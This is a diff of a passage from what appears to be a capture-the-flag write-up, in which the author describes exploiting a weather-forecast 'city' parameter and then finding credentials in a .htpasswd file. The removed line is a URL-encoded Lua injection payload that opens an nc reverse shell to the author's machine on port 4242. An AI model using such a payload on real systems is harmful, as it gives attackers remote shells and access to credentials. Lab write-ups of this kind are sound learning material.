@@ -67,8 +67,6 @@ So I constructed a reverse shell payload and then url-encoded it.
 
 
 
-?city=10.10.10.218%2Fweather%2Fforecast%3Fcity%3D')%3Bos.execute("rm %2Ftmp%2Ff%3Bmkfifo %2Ftmp%2Ff%3Bcat %2Ftmp%2Ff|%2Fbin%2Fsh -i 2>%261|nc 10.10.14.136 4242 >%2Ftmp%2Ff")--
-
 and i passed this to the city variable in the URL and opened a netcat listener on port 4242 on my local machine.
 
 I got a shell as httpd thereafter. And then I checked what files were present in the current directory, I found a .htpasswd file which were the credentials needed to access the web service on port 80.
